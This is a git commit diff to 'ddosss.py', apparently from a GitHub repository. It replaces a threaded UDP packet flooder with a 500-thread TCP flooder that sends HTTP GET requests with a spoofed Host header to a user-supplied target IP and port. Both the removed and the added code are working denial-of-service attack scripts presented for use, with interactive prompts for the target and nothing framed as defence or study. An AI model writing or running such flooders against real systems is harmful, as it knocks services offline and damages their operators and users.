9d62d9bd227ef1bbacbde1febc940416cf9c5bc7
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-09-13 16:46:12 +0300

    Update ddosss.py

--- ddosss.py
+++ ddosss.py
@@ -61,99 +61,43 @@ print("""\033[31m
 time.sleep(2)
 
 
-import time,socket,sys,os,_thread
+import socket
+import threading
+import os
+import time
 
-#=================================================================================================
 
-#color
-class color:
-    red = '\033[91m'
-    sabz = '\033[92m'
-    sefid = '\033[0m'
-    narenji = '\033[93m'
-    abi_kamrang = '\033[94m'
+print ("")
+target = input("[+] Target IP: => ")
+print("Target = ", target)
+fake_ip = input("[+] Fake IP: => ")
+port = input ("[+] Port to attack: => ")
+port_a = int(port)
 
-#=================================================================================================
-if os.name == 'nt':
-    os.system("color A")
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port_a))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port_a))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port_a))
+        s.close()
 
-print('')
-print(color.sefid+'--------------------------------------------------')
-print('')
-print(color.narenji+'  Step 1.  Enter url or ip')
-print(color.narenji+'  Step 2.  Enter power attack')
-print(color.narenji+'  Step 3.  Enter message attack ')
-print(color.narenji+'  Step 4.  Start DDoser !!!')
-print('')
-print(color.sefid+'--------------------------------------------------')
-print('')
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
+    
+    
+attack_num = 0
 
-#=================================================================================================
-
-ior = input('  DDOS attack boy ip & url ? =>  ')
-ioru = ior.lower()
-print('')
-print('')
-if ioru == ('url'):
-    site = input(color.sabz+" Enter target site url => ")
-    print('')
-    ip = socket.gethostbyname(site)
-    print('')
-#=================================================================================================
-
-if ioru == ('ip'):
-    print('')
-    print('')
-    ip = input(str(' Enter target ip => '))
-    print('')
-
-#=================================================================================================
-
-print(" your target IP:  ", ip)
-print('')
-thread_count = input(color.red+" Enter power attack => ")
-print('')
-port = input(" Enter target port =>   ")
-print('')
-UDP_PORT = int(port)
-MESSAGE = input(color.abi_kamrang+'      Enter message =>  ')
-print(color.sefid+'---------------------------------------------------')
-time.sleep(2)
-print("")
-print(color.red+" [       ] 0%")
-time.sleep(1)
-print(color.abi_kamrang+" [=======   ] 20%")
-time.sleep(0.5)
-print(color.abi_kamrang+" [============ ] 40%")
-time.sleep(0.4)
-print(color.abi_kamrang+" [================ ] 60%")
-time.sleep(0.5)
-print(color.abi_kamrang+" [==================== ] 80%")
-time.sleep(0.6)
-print(color.abi_kamrang+" [========================= ] 100%")
-if os.name == 'nt':
-    os.system('cls')
-else:
-    os.system('clear')
-
-print('''starting...''')
-print('')
-print(color.sefid+'--------------------------------------------------')
-print(color.sabz+"UDP target IP: ", ip)
-print(color.sabz+"UDP target port: ", UDP_PORT)
-time.sleep(3)
-
-#==========================================START=DDOS=======================================================
-
-def ddos(i):
-    while 1:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
-        print(color.sabz+" DDos ataack !!! ")
-for i in range(int(thread_count)):
-    try:
-        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
-    except KeyboardInterrupt:
-        sys.exit(0)
-while 1:
-    pass
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port_a))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port_a))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port_a))
+        
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+        
+        s.close()
